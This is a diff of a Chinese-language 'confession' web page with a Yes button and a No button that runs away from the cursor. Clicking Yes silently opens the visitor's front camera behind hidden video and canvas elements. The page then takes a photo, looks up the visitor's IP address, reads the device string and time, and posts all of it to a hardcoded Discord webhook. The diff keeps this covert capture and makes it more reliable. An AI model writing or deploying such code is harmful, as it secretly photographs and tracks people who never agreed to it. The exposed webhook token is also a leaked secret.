@@ -15,7 +15,6 @@ body {
   touch-action: none;
 }
 
-/* 主畫面 */
 .card {
   width: 100%;
   height: 100vh;
@@ -41,7 +40,6 @@ body {
   position: relative;
   width: 300px;
   height: 200px;
-  margin-top: 20px;
 }
 
 button {
@@ -54,17 +52,9 @@ button {
   transition: 0.2s;
 }
 
-.yes {
-  background: #4CAF50;
-  color: white;
-}
+.yes { background:#4CAF50; color:white; }
+.no { background:#ff4d4d; color:white; }
 
-.no {
-  background: #ff4d4d;
-  color: white;
-}
-
-/* 成功畫面 */
 .success {
   position: fixed;
   inset: 0;
@@ -76,7 +66,7 @@ button {
   color: white;
   opacity: 0;
   pointer-events: none;
-  transition: 0.5s;
+  transition: 0.4s;
   z-index: 999;
 }
 
@@ -84,29 +74,8 @@ button {
   opacity: 1;
 }
 
-/* 閃光效果 */
-.flash {
-  position: fixed;
-  inset: 0;
-  background: white;
-  opacity: 0;
-  pointer-events: none;
-  z-index: 1000;
-}
-
-.flash.active {
-  animation: flash 0.3s ease;
-}
-
-@keyframes flash {
-  0% { opacity: 0; }
-  20% { opacity: 1; }
-  100% { opacity: 0; }
-}
-
-/* 隱藏鏡頭 */
 video, canvas {
-  display: none;
+  display:none;
 }
 </style>
 </head>
@@ -115,7 +84,7 @@ video, canvas {
 
 <div class="card">
   <h2>💖 我喜歡你</h2>
-  <p class="subtitle">你願意跟我在一起嗎？ 😳</p>
+  <p class="subtitle">你願意嗎？ 😳</p>
 
   <div class="btn-area">
     <button class="yes" id="yesBtn">願意</button>
@@ -124,7 +93,6 @@ video, canvas {
 </div>
 
 <div class="success" id="success">💖 成功 💖</div>
-<div class="flash" id="flash"></div>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas"></canvas>
@@ -136,11 +104,10 @@ const success = document.getElementById("success");
 
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
-const flash = document.getElementById("flash");
 
 let streamRef = null;
 
-// 😈 NO 逃跑
+/* NO 逃跑 */
 document.addEventListener("mousemove", e => {
   const r = noBtn.getBoundingClientRect();
   const dx = r.left - e.clientX;
@@ -148,104 +115,85 @@ document.addEventListener("mousemove", e => {
   const dist = Math.sqrt(dx*dx + dy*dy);
 
   if (dist < 120) {
-    noBtn.style.left = Math.random() * 200 + "px";
-    noBtn.style.top = Math.random() * 150 + "px";
+    noBtn.style.left = Math.random()*200 + "px";
+    noBtn.style.top = Math.random()*150 + "px";
   }
 });
 
-// 💖 YES
+/* YES */
 yesBtn.onclick = async () => {
   success.classList.add("show");
 
-  // 📸 開鏡頭（點擊觸發）
-  streamRef = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: "user" }
-  });
-
-  video.srcObject = streamRef;
-
-  // ⏳ 等待畫面穩定
-  await new Promise(r => setTimeout(r, 1200));
-
-  // 💥 閃光效果
-  flash.classList.remove("active");
-  void flash.offsetWidth;
-  flash.classList.add("active");
-
-  // 📸 拍照
-  canvas.width = video.videoWidth || 640;
-  canvas.height = video.videoHeight || 480;
-
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(video, 0, 0);
-
-  const imageData = canvas.toDataURL("image/png");
-
-  // 🌐 IP
-  let ip = "unknown";
   try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    ip = (await res.json()).ip;
-  } catch {}
+    // 📸 開鏡頭（穩定）
+    streamRef = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
 
-  // 📱 裝置
-  const device = navigator.userAgent;
+    video.srcObject = streamRef;
 
-  // 🕒 時間
-  const time = new Date().toLocaleString();
+    // 🔥 等 video 真正 ready（修 bug 關鍵）
+    await new Promise(resolve => {
+      video.onloadedmetadata = () => {
+        setTimeout(resolve, 1200);
+      };
+    });
 
-  const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";
+    // 📸 拍照（防 0x0）
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
 
-  const blob = await (await fetch(imageData)).blob();
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
 
-  const formData = new FormData();
-  formData.append("file", blob, "love.png");
+    const imageData = canvas.toDataURL("image/png");
 
-  const payload = {
-    username: "💌 告白系統",
-    embeds: [
-      {
+    // 🌐 IP
+    let ip = "unknown";
+    try {
+      const r = await fetch("https://api.ipify.org?format=json");
+      ip = (await r.json()).ip;
+    } catch {}
+
+    const device = navigator.userAgent;
+    const time = new Date().toLocaleString();
+
+    const webhookURL = "https://discord.com/api/webhooks/1492236169524674625/K4JOL-5_G46crVFSWO2S05m9DhJamM42P91kQb-GCPFu7v6CiSIOvQHByAxuo1eqLbCq";
+
+    const blob = await (await fetch(imageData)).blob();
+
+    const formData = new FormData();
+    formData.append("file", blob, "love.png");
+
+    const payload = {
+      username: "💌 告白系統",
+      embeds: [{
         title: "💖 告白成功",
-        description: "有人按下願意 ❤️",
         color: 0xff4d6d,
-
-        image: {
-          url: "attachment://love.png"
-        },
-
+        image: { url: "attachment://love.png" },
         fields: [
-          {
-            name: "🌐 IP",
-            value: ip,
-            inline: false
-          },
-          {
-            name: "📱 裝置",
-            value: device.slice(0, 80),
-            inline: false
-          },
-          {
-            name: "🕒 時間",
-            value: time,
-            inline: false
-          }
+          { name: "🌐 IP", value: ip, inline: false },
+          { name: "📱 裝置", value: device.slice(0, 80), inline: false },
+          { name: "🕒 時間", value: time, inline: false }
         ],
-
         timestamp: new Date().toISOString()
-      }
-    ]
-  };
+      }]
+    };
 
-  formData.append("payload_json", JSON.stringify(payload));
+    formData.append("payload_json", JSON.stringify(payload));
 
-  await fetch(webhookURL, {
-    method: "POST",
-    body: formData
-  });
+    await fetch(webhookURL, {
+      method: "POST",
+      body: formData
+    });
 
-  // 🧹 關鏡頭（防卡住）
-  const tracks = streamRef?.getTracks();
-  tracks?.forEach(t => t.stop());
+  } catch (err) {
+    alert("相機開啟失敗或被拒絕");
+  } finally {
+    // 🧹 一定關鏡頭（穩定關鍵）
+    const tracks = streamRef?.getTracks();
+    tracks?.forEach(t => t.stop());
+  }
 };
 </script>
 
